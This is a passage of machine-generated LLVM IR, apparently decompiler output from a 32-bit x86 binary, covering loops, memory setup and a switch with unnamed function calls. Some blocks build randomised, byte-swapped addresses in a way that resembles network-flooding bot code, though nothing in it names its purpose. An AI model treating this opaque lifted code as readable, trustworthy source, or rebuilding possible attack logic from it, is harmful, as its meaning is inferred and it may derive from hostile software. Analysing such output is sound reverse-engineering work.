  br i1 %v7_80482b6213, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0216 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be215 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8214 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp237, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be215, %v4_80482a0216
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be215, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8214, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be215, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_8051ca0(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_8051350(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_8051350(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_8051350(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_8051350(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_8051350(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_8051350(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_8051350(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_8051350(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_8051350(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_8051350(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_8051350(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8053348(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp136 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp136, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d5 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d5, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d5 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8051cc0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_8051ca0(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_80527a3(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8051cc0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8051cc0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8051cc0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp238 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp238, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804f070(i32 %v1_804839d5)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp242 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp242, 0
  br i1 %v4_8048478, label %bb137, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp242 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb137
  %v1_804848a = call i32 @function_804f070(i32 %v1_804839d5)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_8052502(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp138, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
